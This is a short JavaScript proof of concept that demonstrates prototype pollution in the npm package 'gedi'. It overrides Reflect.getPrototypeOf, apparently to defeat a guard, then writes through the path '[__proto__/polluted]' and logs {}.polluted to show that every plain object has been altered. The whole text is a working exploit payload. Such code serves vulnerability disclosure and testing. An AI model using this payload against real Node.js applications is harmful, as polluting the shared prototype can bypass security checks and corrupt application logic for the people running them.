Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const gedi = require('gedi');
gedi().set('[__proto__/polluted]', 'yes');
console.log({}.polluted);